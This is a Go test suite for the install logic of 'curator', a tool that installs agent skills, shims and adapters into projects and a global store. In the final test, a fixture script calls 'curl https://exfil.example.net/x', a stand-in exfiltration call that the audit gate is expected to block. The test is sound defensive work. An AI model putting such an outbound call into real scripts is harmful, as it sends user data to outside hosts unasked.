package install

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/relux-works/curator/internal/closure"
	"github.com/relux-works/curator/internal/config"
	manifestpkg "github.com/relux-works/curator/internal/manifest"
	"github.com/relux-works/curator/internal/marker"
)

type env struct {
	t          *testing.T
	skillsRoot string
	home       string
	project    string
	cfg        *config.Config
}

func newEnv(t *testing.T) *env {
	t.Helper()
	e := &env{t: t, skillsRoot: t.TempDir(), home: t.TempDir(), project: t.TempDir()}
	e.git(e.project, "init", "-q")
	e.cfg = &config.Config{
		Path:          filepath.Join(e.home, "config.json"),
		SkillsRoot:    e.skillsRoot,
		DefaultAgents: []string{"claude_code"},
		AdapterMode:   "copy",
	}
	return e
}

func (e *env) git(dir string, args ...string) {
	e.t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.com",
		"GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.com",
	)
	if out, err := cmd.CombinedOutput(); err != nil {
		e.t.Fatalf("git %v: %v\n%s", args, err, out)
	}
}

func (e *env) write(root, rel, content string) {
	e.t.Helper()
	full := filepath.Join(root, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		e.t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		e.t.Fatal(err)
	}
}

// skill creates a tagged skill repository with one exported command.
func (e *env) skill(name string) {
	e.t.Helper()
	dir := filepath.Join(e.skillsRoot, name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		e.t.Fatal(err)
	}
	e.git(dir, "init", "-q", "-b", "main")
	e.write(dir, "SKILL.md", "---\nname: "+name+"\ndescription: d\n---\n# "+name+"\n")
	e.write(dir, "references/info.md", "ref")
	e.write(dir, "scripts/"+name+"-tool", "#!/bin/sh\necho "+name+"\n")
	e.write(dir, "README.md", "dev docs")
	spec := map[string]any{
		"schema_version": 4,
		"capabilities":   map[string]any{},
		"runtime_roots":  []string{"scripts"},
		"commands": map[string]any{
			name + "-tool": map[string]any{"type": "script", "unix_path": "scripts/" + name + "-tool", "win_path": "scripts/" + name + "-tool"},
		},
	}
	payload, _ := json.MarshalIndent(spec, "", "  ")
	e.write(dir, "csk-skill.json", string(payload))
	e.git(dir, "add", ".")
	e.git(dir, "commit", "-qm", "init")
	e.git(dir, "tag", "v1")
}

func (e *env) declare(names ...string) {
	e.t.Helper()
	skills := []map[string]any{}
	for _, name := range names {
		skills = append(skills, map[string]any{"name": name, "tag": "v1"})
	}
	payload, _ := json.MarshalIndent(map[string]any{
		"schema_version": 1,
		"agents":         []string{"claude_code"},
		"skills":         skills,
	}, "", "  ")
	e.write(e.project, "Skillfile.json", string(payload))
	e.write(e.project, ".gitignore", ".agents/\n.claude/skills/\nSkillfile.dev.json\n")
}

func (e *env) install(opts Options) Result {
	e.t.Helper()
	opts.Platform = "unix"
	return Project(e.cfg, e.project, "test", opts)
}

func TestEndToEndInstall(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-a")
	e.declare("skill-a")

	result := e.install(Options{})
	if result.Status != "ok" {
		t.Fatalf("install failed: %+v", result)
	}

	// context installed, developer files excluded
	installed := filepath.Join(e.project, ".agents", "skills", "skill-a")
	if _, err := os.Stat(filepath.Join(installed, "SKILL.md")); err != nil {
		t.Fatal("context missing")
	}
	if _, err := os.Stat(filepath.Join(installed, "README.md")); err == nil {
		t.Fatal("README leaked into context")
	}
	if _, err := os.Stat(filepath.Join(installed, "scripts")); err == nil {
		t.Fatal("runtime root leaked into context")
	}

	// marker present and adapter mirrored
	recorded := marker.Read(installed)
	if recorded == nil || recorded.Name != "skill-a" || len(recorded.Files) == 0 {
		t.Fatalf("marker: %+v", recorded)
	}
	if _, err := os.Stat(filepath.Join(e.project, ".claude", "skills", "skill-a", "SKILL.md")); err != nil {
		t.Fatal("adapter mirror missing")
	}

	// shim exists and points into the runtime store
	shim := filepath.Join(e.project, ".agents", "bin", "skill-a-tool")
	if _, err := os.Lstat(shim); err != nil {
		t.Fatal("shim missing")
	}
	if !strings.Contains(strings.Join(result.Messages, "\n"), "curator shell-init --install") {
		t.Fatalf("install did not explain shell-neutral command access: %v", result.Messages)
	}
	// env files
	if _, err := os.Stat(filepath.Join(e.project, ".agents", "env.sh")); err != nil {
		t.Fatal("env.sh missing")
	}
}

func TestRuntimeLauncherResolvesSkillDependencyWithoutShellHook(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("executes POSIX skill commands")
	}
	e := newEnv(t)
	e.skill("provider")
	e.skill("consumer")
	consumerDir := filepath.Join(e.skillsRoot, "consumer")
	e.write(consumerDir, "scripts/consumer-tool", "#!/bin/sh\nprovider-tool\n")
	spec := map[string]any{
		"schema_version": 4,
		"capabilities":   map[string]any{},
		"runtime_roots":  []string{"scripts"},
		"commands": map[string]any{
			"consumer-tool": map[string]any{"type": "script", "unix_path": "scripts/consumer-tool"},
		},
		"dependencies": map[string]any{
			"skills": map[string]any{
				"provider": map[string]any{
					"git":  filepath.Join(e.skillsRoot, "provider"),
					"ref":  map[string]any{"kind": "tag", "value": "v1"},
					"mode": "runtime", "commands": []string{"provider-tool"},
				},
			},
		},
	}
	payload, _ := json.MarshalIndent(spec, "", "  ")
	e.write(consumerDir, "csk-skill.json", string(payload))
	e.git(consumerDir, "commit", "-qam", "call provider")
	e.git(consumerDir, "tag", "-f", "v1")
	e.declare("consumer")

	result := e.install(Options{})
	if result.Status != "ok" {
		t.Fatalf("install failed: %+v", result)
	}
	command := exec.Command(filepath.Join(e.project, ".agents", "bin", "consumer-tool"))
	command.Env = []string{"PATH=/usr/bin:/bin"}
	output, err := command.CombinedOutput()
	if err != nil || strings.TrimSpace(string(output)) != "provider" {
		t.Fatalf("consumer command: %v\n%s", err, output)
	}
}

func TestRuntimeLauncherCapturesDeclaredSystemDependency(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("executes POSIX skill commands")
	}
	e := newEnv(t)
	e.skill("consumer")
	helperBin := filepath.Join(t.TempDir(), "helper bin")
	if err := os.MkdirAll(helperBin, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(helperBin, "declared-helper"), []byte("#!/bin/sh\necho system-resolved\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", helperBin+string(os.PathListSeparator)+os.Getenv("PATH"))
	consumerDir := filepath.Join(e.skillsRoot, "consumer")
	e.write(consumerDir, "scripts/consumer-tool", "#!/bin/sh\ndeclared-helper\n")
	spec := map[string]any{
		"schema_version": 4,
		"capabilities":   map[string]any{},
		"runtime_roots":  []string{"scripts"},
		"commands": map[string]any{
			"consumer-tool": map[string]any{"type": "script", "unix_path": "scripts/consumer-tool"},
		},
		"dependencies": map[string]any{
			"commands": map[string]any{
				"declared-helper": map[string]any{"type": "system", "command": "declared-helper"},
			},
		},
	}
	payload, _ := json.MarshalIndent(spec, "", "  ")
	e.write(consumerDir, "csk-skill.json", string(payload))
	e.git(consumerDir, "commit", "-qam", "declare helper")
	e.git(consumerDir, "tag", "-f", "v1")
	e.declare("consumer")

	result := e.install(Options{})
	if result.Status != "ok" {
		t.Fatalf("install failed: %+v", result)
	}
	command := exec.Command(filepath.Join(e.project, ".agents", "bin", "consumer-tool"))
	command.Env = []string{"PATH=/usr/bin:/bin"}
	output, err := command.CombinedOutput()
	if err != nil || strings.TrimSpace(string(output)) != "system-resolved" {
		t.Fatalf("consumer command: %v\n%s", err, output)
	}
}

func TestSecondInstallIsUpToDate(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-a")
	e.declare("skill-a")
	if result := e.install(Options{}); result.Status != "ok" {
		t.Fatalf("first: %+v", result)
	}
	second := e.install(Options{})
	if second.Status != "ok" {
		t.Fatalf("second: %+v", second)
	}
	joined := strings.Join(second.Messages, "\n")
	if !strings.Contains(joined, "up-to-date") {
		t.Fatalf("second install must be up-to-date:\n%s", joined)
	}
}

func TestTamperTriggersReinstall(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-a")
	e.declare("skill-a")
	if result := e.install(Options{}); result.Status != "ok" {
		t.Fatalf("first: %+v", result)
	}
	installed := filepath.Join(e.project, ".agents", "skills", "skill-a")
	if err := os.WriteFile(filepath.Join(installed, "SKILL.md"), []byte("tampered"), 0o644); err != nil {
		t.Fatal(err)
	}
	result := e.install(Options{})
	joined := strings.Join(result.Messages, "\n")
	if !strings.Contains(joined, "installed") {
		t.Fatalf("tampered install must reinstall:\n%s", joined)
	}
	payload, _ := os.ReadFile(filepath.Join(installed, "SKILL.md"))
	if string(payload) == "tampered" {
		t.Fatal("tampered content survived")
	}
}

func TestRemovedSkillCleanedUp(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-a")
	e.skill("skill-b")
	e.declare("skill-a", "skill-b")
	if result := e.install(Options{}); result.Status != "ok" {
		t.Fatalf("first: %+v", result)
	}
	e.declare("skill-a")
	if result := e.install(Options{}); result.Status != "ok" {
		t.Fatalf("second: %+v", result)
	}
	if _, err := os.Stat(filepath.Join(e.project, ".agents", "skills", "skill-b")); err == nil {
		t.Fatal("removed skill left in context")
	}
	if _, err := os.Stat(filepath.Join(e.project, ".agents", "bin", "skill-b-tool")); err == nil {
		t.Fatal("stale shim survived")
	}
	if _, err := os.Stat(filepath.Join(e.project, ".claude", "skills", "skill-b")); err == nil {
		t.Fatal("stale adapter entry survived")
	}
}

func TestDryRunTouchesNothing(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-a")
	e.declare("skill-a")
	skillRepo := filepath.Join(e.skillsRoot, "skill-a")
	e.git(skillRepo, "remote", "add", "origin", "https://example.invalid/skill-a.git")
	e.cfg.Audit.Enabled = true
	result := e.install(Options{DryRun: true, Fetch: true})
	if result.Status != "ok" {
		t.Fatalf("dry-run: %+v", result)
	}
	if _, err := os.Stat(filepath.Join(e.project, ".agents", "skills")); err == nil {
		t.Fatal("dry-run wrote files")
	}
	for _, path := range []string{
		filepath.Join(e.home, "cache"),
		filepath.Join(e.home, "audit"),
		filepath.Join(e.home, "state"),
		filepath.Join(e.home, "runtime"),
		filepath.Join(skillRepo, ".git", "FETCH_HEAD"),
	} {
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			t.Fatalf("dry-run changed persistent state at %s: %v", path, err)
		}
	}
	joined := strings.Join(result.Messages, "\n")
	if !strings.Contains(joined, "(planned)") || !strings.Contains(joined, "dry-run") {
		t.Fatalf("dry-run messages:\n%s", joined)
	}
}

func TestGitignoreGateSkips(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-a")
	e.declare("skill-a")
	// remove the ignore file: the gate must skip the project
	if err := os.Remove(filepath.Join(e.project, ".gitignore")); err != nil {
		t.Fatal(err)
	}
	result := e.install(Options{})
	if result.Status != "skipped" {
		t.Fatalf("status = %s, want skipped", result.Status)
	}
	// and --fix-gitignore repairs it
	result = e.install(Options{FixGitignore: true})
	if result.Status != "ok" {
		t.Fatalf("fix failed: %+v", result)
	}
}

func TestMissingSystemCommandFails(t *testing.T) {
	e := newEnv(t)
	name := "skill-sys"
	dir := filepath.Join(e.skillsRoot, name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	e.git(dir, "init", "-q", "-b", "main")
	e.write(dir, "SKILL.md", "# s")
	spec := `{"schema_version": 2, "dependencies": {"commands": {
		"ghost": {"type": "system", "command": "definitely-not-a-binary-xyz", "hint": "install it via bootstrap"}}}}`
	e.write(dir, "csk-skill.json", spec)
	e.git(dir, "add", ".")
	e.git(dir, "commit", "-qm", "init")
	e.git(dir, "tag", "v1")
	e.declare(name)

	result := e.install(Options{})
	if result.Status != "failed" {
		t.Fatalf("status = %s, want failed", result.Status)
	}
	joined := strings.Join(result.Errors, "\n")
	if !strings.Contains(joined, "definitely-not-a-binary-xyz") || !strings.Contains(joined, "install it via bootstrap") {
		t.Fatalf("error must carry the binary and the hint:\n%s", joined)
	}
}

func TestMovedTagWarningAndStrict(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-a")
	e.declare("skill-a")
	if result := e.install(Options{}); result.Status != "ok" {
		t.Fatalf("first: %+v", result)
	}
	// move the tag to a new commit
	dir := filepath.Join(e.skillsRoot, "skill-a")
	e.write(dir, "SKILL.md", "---\nname: skill-a\ndescription: d2\n---\n# v2\n")
	e.git(dir, "commit", "-qam", "two")
	e.git(dir, "tag", "-f", "v1")

	// strict first: the recorded marker still names the old commit
	strict := e.install(Options{StrictTags: true})
	if strict.Status != "failed" || !strings.Contains(strings.Join(strict.Errors, "\n"), "moved tag for skill-a") {
		t.Fatalf("strict tags must fail: %+v", strict)
	}

	// non-strict warns and reinstalls; afterwards the move is absorbed
	result := e.install(Options{})
	joined := strings.Join(result.Messages, "\n")
	if result.Status != "ok" || !strings.Contains(joined, "moved tag for skill-a") {
		t.Fatalf("moved tag warning missing: %+v", result)
	}
	again := e.install(Options{StrictTags: true})
	if again.Status != "ok" {
		t.Fatalf("absorbed move must pass strict: %+v", again)
	}
}

func TestRuntimeOnlyProviderGetsMarkerNoAdapter(t *testing.T) {
	e := newEnv(t)
	// provider with a command; consumer requires it runtime-only
	e.skill("provider")
	consumer := filepath.Join(e.skillsRoot, "consumer")
	if err := os.MkdirAll(consumer, 0o755); err != nil {
		t.Fatal(err)
	}
	e.git(consumer, "init", "-q", "-b", "main")
	e.write(consumer, "SKILL.md", "# consumer")
	spec := `{"schema_version": 4, "capabilities": {}, "dependencies": {"skills": {
		"provider": {"git": "./provider", "ref": {"kind": "tag", "value": "v1"}, "mode": "runtime"}}}}`
	e.write(consumer, "csk-skill.json", spec)
	e.git(consumer, "add", ".")
	e.git(consumer, "commit", "-qm", "init")
	e.git(consumer, "tag", "v1")
	e.declare("consumer")

	result := e.install(Options{})
	if result.Status != "ok" {
		t.Fatalf("install: %+v", result)
	}
	providerDir := filepath.Join(e.project, ".agents", "skills", "provider")
	recorded := marker.Read(providerDir)
	if recorded == nil {
		t.Fatal("runtime-only provider must carry a marker")
	}
	if recorded.Activation == nil || recorded.Activation.Context {
		t.Fatalf("provider activation: %+v", recorded.Activation)
	}
	if _, err := os.Stat(filepath.Join(providerDir, "SKILL.md")); err == nil {
		t.Fatal("runtime-only provider must not install context")
	}
	if _, err := os.Stat(filepath.Join(e.project, ".claude", "skills", "provider")); err == nil {
		t.Fatal("adapters must not mirror marker-only nodes")
	}
	// but its command is live
	if _, err := os.Lstat(filepath.Join(e.project, ".agents", "bin", "provider-tool")); err != nil {
		t.Fatal("provider command shim missing")
	}
}

func TestRuntimeOnlyProviderStillRequiresSkillMd(t *testing.T) {
	e := newEnv(t)
	e.skill("provider")
	provider := filepath.Join(e.skillsRoot, "provider")
	if err := os.Remove(filepath.Join(provider, "SKILL.md")); err != nil {
		t.Fatal(err)
	}
	e.git(provider, "add", "-u")
	e.git(provider, "commit", "-qm", "remove required skill file")
	e.git(provider, "tag", "-f", "v1")

	consumer := filepath.Join(e.skillsRoot, "consumer")
	if err := os.MkdirAll(consumer, 0o755); err != nil {
		t.Fatal(err)
	}
	e.git(consumer, "init", "-q", "-b", "main")
	e.write(consumer, "SKILL.md", "# consumer")
	e.write(consumer, "csk-skill.json", `{"schema_version": 4, "capabilities": {}, "dependencies": {"skills": {
		"provider": {"git": "./provider", "ref": {"kind": "tag", "value": "v1"}, "mode": "runtime"}}}}`)
	e.git(consumer, "add", ".")
	e.git(consumer, "commit", "-qm", "init")
	e.git(consumer, "tag", "v1")
	e.declare("consumer")

	result := e.install(Options{})
	if result.Status != "failed" || !strings.Contains(strings.Join(result.Errors, "\n"), "required SKILL.md not found") {
		t.Fatalf("runtime-only provider without SKILL.md must fail: %+v", result)
	}
	if _, err := os.Stat(filepath.Join(e.project, ".agents")); !os.IsNotExist(err) {
		t.Fatalf("validation failure must precede materialization: %v", err)
	}
}

func TestHybridSkillActivatesWithoutTouchingProjectStore(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-h")
	e.declare() // empty project manifest

	// hybrid declaration targeting the project by alias
	if err := os.MkdirAll(filepath.Join(e.home, "hybrid"), 0o755); err != nil {
		t.Fatal(err)
	}
	hybrid := `{"schema_version": 1, "skills": [
		{"name": "skill-h", "tag": "v1", "targets": ["test"]}]}`
	e.write(e.home, "hybrid/Skillfile.json", hybrid)

	result := e.install(Options{})
	if result.Status != "ok" {
		t.Fatalf("install: %+v", result)
	}
	joined := strings.Join(result.Messages, "\n")
	if !strings.Contains(joined, "(hybrid)") {
		t.Fatalf("hybrid suffix missing:\n%s", joined)
	}
	// context lives in the machine store, not the project store
	if _, err := os.Stat(filepath.Join(e.home, "hybrid", "skills", "skill-h", "SKILL.md")); err != nil {
		t.Fatal("hybrid store context missing")
	}
	if _, err := os.Stat(filepath.Join(e.project, ".agents", "skills", "skill-h")); err == nil {
		t.Fatal("hybrid skill leaked into the project store")
	}
	// but adapters mirror it into the project, and its command is live
	if _, err := os.Stat(filepath.Join(e.project, ".claude", "skills", "skill-h", "SKILL.md")); err != nil {
		t.Fatal("adapter must mirror the hybrid store")
	}
	if _, err := os.Lstat(filepath.Join(e.project, ".agents", "bin", "skill-h-tool")); err != nil {
		t.Fatal("hybrid command shim missing")
	}
}

func TestHybridShadowedByProjectDeclaration(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-a")
	e.declare("skill-a")
	if err := os.MkdirAll(filepath.Join(e.home, "hybrid"), 0o755); err != nil {
		t.Fatal(err)
	}
	e.write(e.home, "hybrid/Skillfile.json", `{"schema_version": 1, "skills": [
		{"name": "skill-a", "tag": "v1", "targets": ["test"]}]}`)
	result := e.install(Options{})
	if result.Status != "ok" {
		t.Fatalf("install: %+v", result)
	}
	joined := strings.Join(result.Messages, "\n")
	if !strings.Contains(joined, "shadowed by the project declaration") {
		t.Fatalf("shadow message missing:\n%s", joined)
	}
	// installed in the project store, not the hybrid store
	if _, err := os.Stat(filepath.Join(e.project, ".agents", "skills", "skill-a", "SKILL.md")); err != nil {
		t.Fatal("project store install missing")
	}
	if _, err := os.Stat(filepath.Join(e.home, "hybrid", "skills", "skill-a")); err == nil {
		t.Fatal("shadowed hybrid skill materialized in the hybrid store")
	}
}

func TestGlobalInstall(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-g")
	if _, err := GlobalInit(e.home); err != nil {
		t.Fatal(err)
	}
	if err := manifestAddGlobal(e, "skill-g"); err != nil {
		t.Fatal(err)
	}
	userHome := t.TempDir()
	userBin := filepath.Join(userHome, ".local", "bin")
	if runtime.GOOS != "windows" {
		if err := os.MkdirAll(userBin, 0o755); err != nil {
			t.Fatal(err)
		}
		t.Setenv("PATH", userBin+string(os.PathListSeparator)+os.Getenv("PATH"))
	}
	result := Global(e.cfg, userHome, Options{Platform: "unix"})
	if result.Status != "ok" {
		t.Fatalf("global install: %+v", result)
	}
	if _, err := os.Stat(filepath.Join(e.home, "global", "skills", "skill-g", "SKILL.md")); err != nil {
		t.Fatal("global context missing")
	}
	if _, err := os.Lstat(filepath.Join(e.home, "global", "bin", "skill-g-tool")); err != nil {
		t.Fatal("global shim missing")
	}
	if _, err := os.Stat(filepath.Join(userHome, ".claude", "skills", "skill-g", "SKILL.md")); err != nil {
		t.Fatal("home adapter mirror missing")
	}
	if _, err := os.Stat(filepath.Join(e.home, "global", "env.sh")); err != nil {
		t.Fatal("global env missing")
	}
	if runtime.GOOS != "windows" {
		if _, err := os.Lstat(filepath.Join(userBin, "skill-g-tool")); err != nil {
			t.Fatal("PATH-visible global forwarding shim missing")
		}
	}
}

func TestGlobalUpgradeDryRunLeavesPersistentStateUnchanged(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-g")
	if _, err := GlobalInit(e.home); err != nil {
		t.Fatal(err)
	}
	if err := manifestAddGlobal(e, "skill-g"); err != nil {
		t.Fatal(err)
	}
	repo := filepath.Join(e.skillsRoot, "skill-g")
	e.git(repo, "remote", "add", "origin", "https://example.invalid/skill-g.git")
	e.cfg.Audit.Enabled = true

	result := Global(e.cfg, t.TempDir(), Options{Platform: "unix", DryRun: true, Fetch: true})
	if result.Status != "ok" {
		t.Fatalf("global dry-run: %+v", result)
	}
	for _, path := range []string{
		filepath.Join(e.home, "cache"),
		filepath.Join(e.home, "audit"),
		filepath.Join(e.home, "state"),
		filepath.Join(e.home, "runtime"),
		filepath.Join(e.home, "global", "skills"),
		filepath.Join(e.home, "global", "bin"),
		filepath.Join(repo, ".git", "FETCH_HEAD"),
	} {
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			t.Fatalf("global dry-run changed persistent state at %s: %v", path, err)
		}
	}
}

func TestGlobalInstallUsesManifestLocaleAndAuditGate(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-g")
	if err := os.MkdirAll(GlobalRoot(e.home), 0o755); err != nil {
		t.Fatal(err)
	}
	e.write(GlobalRoot(e.home), "Skillfile.json", `{
		"schema_version": 1, "locale": "fr", "agents": ["claude_code"],
		"skills": [{"name": "skill-g", "tag": "v1"}]}`)

	blocked := Global(e.cfg, t.TempDir(), Options{
		Platform: "unix",
		AuditGate: func(_ []*closure.Node) ([]string, []string) {
			return nil, []string{"blocked by review gate"}
		},
	})
	if blocked.Status != "failed" || !strings.Contains(strings.Join(blocked.Errors, "\n"), "blocked by review gate") {
		t.Fatalf("global audit gate must block: %+v", blocked)
	}
	if _, err := os.Stat(filepath.Join(e.home, "global", "skills")); !os.IsNotExist(err) {
		t.Fatalf("audit block must precede global materialization: %v", err)
	}

	result := Global(e.cfg, t.TempDir(), Options{Platform: "unix"})
	if result.Status != "ok" {
		t.Fatalf("global install: %+v", result)
	}
	recorded := marker.Read(filepath.Join(e.home, "global", "skills", "skill-g"))
	if recorded == nil || recorded.Locale != "fr" {
		t.Fatalf("global marker locale = %+v, want fr", recorded)
	}
}

func TestGlobalStrictTagsDetectMovedTag(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-g")
	if _, err := GlobalInit(e.home); err != nil {
		t.Fatal(err)
	}
	if err := manifestAddGlobal(e, "skill-g"); err != nil {
		t.Fatal(err)
	}
	userHome := t.TempDir()
	if result := Global(e.cfg, userHome, Options{Platform: "unix"}); result.Status != "ok" {
		t.Fatalf("initial global install: %+v", result)
	}
	repo := filepath.Join(e.skillsRoot, "skill-g")
	e.write(repo, "SKILL.md", "# moved\n")
	e.git(repo, "add", ".")
	e.git(repo, "commit", "-qm", "move tag")
	e.git(repo, "tag", "-f", "v1")
	strict := Global(e.cfg, userHome, Options{Platform: "unix", StrictTags: true})
	if strict.Status != "failed" || !strings.Contains(strings.Join(strict.Errors, "\n"), "moved tag") {
		t.Fatalf("strict global tags must fail: %+v", strict)
	}
}

func manifestAddGlobal(e *env, name string) error {
	return manifestpkg.AddDecl(GlobalRoot(e.home), name, "tag", "v1", "", "")
}

func TestMcpRequirementGatesInstall(t *testing.T) {
	e := newEnv(t)
	name := "skill-mcp"
	dir := filepath.Join(e.skillsRoot, name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	e.git(dir, "init", "-q", "-b", "main")
	e.write(dir, "SKILL.md", "# s")
	spec := `{"schema_version": 5, "capabilities": {}, "dependencies": {"mcp_servers": {
		"sheets": {"hint": "connect the sheets server"}}}}`
	e.write(dir, "csk-skill.json", spec)
	e.git(dir, "add", ".")
	e.git(dir, "commit", "-qm", "init")
	e.git(dir, "tag", "v1")
	e.declare(name)

	// no server configured anywhere: any-semantics failure with the hint
	userHome := t.TempDir()
	e2 := e.install(Options{VerifyMcp: nil, Platform: "unix"})
	_ = userHome
	if e2.Status != "failed" || !strings.Contains(strings.Join(e2.Errors, "\n"), "connect the sheets server") {
		t.Fatalf("mcp gate: %+v", e2)
	}
}

func TestAuditGateBlocksUndeclaredNetwork(t *testing.T) {
	e := newEnv(t)
	e.skill("skill-a") // its script has no network calls: passes
	name := "skill-net"
	dir := filepath.Join(e.skillsRoot, name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	e.git(dir, "init", "-q", "-b", "main")
	e.write(dir, "SKILL.md", "# s")
	e.write(dir, "scripts/tool", "curl https://exfil.example.net/x\n")
	e.write(dir, "csk-skill.json", `{"schema_version": 3, "capabilities": {},
		"runtime_roots": ["scripts"],
		"commands": {"net-tool": {"type": "script", "unix_path": "scripts/tool"}}}`)
	e.git(dir, "add", ".")
	e.git(dir, "commit", "-qm", "init")
	e.git(dir, "tag", "v1")
	e.declare(name)
	e.cfg.Audit.Enabled = true
	e.cfg.Audit.Mode = "strict"
	e.cfg.Audit.FailOn = "high"

	result := e.install(Options{})
	if result.Status != "failed" || !strings.Contains(strings.Join(result.Errors, "\n"), "network-undeclared") {
		t.Fatalf("audit must block: %+v", result)
	}
	// advisory: warns and proceeds
	e.cfg.Audit.Mode = "advisory"
	result = e.install(Options{})
	if result.Status != "ok" || !strings.Contains(strings.Join(result.Messages, "\n"), "audit warning") {
		t.Fatalf("advisory must warn and pass: %+v", result)
	}
}
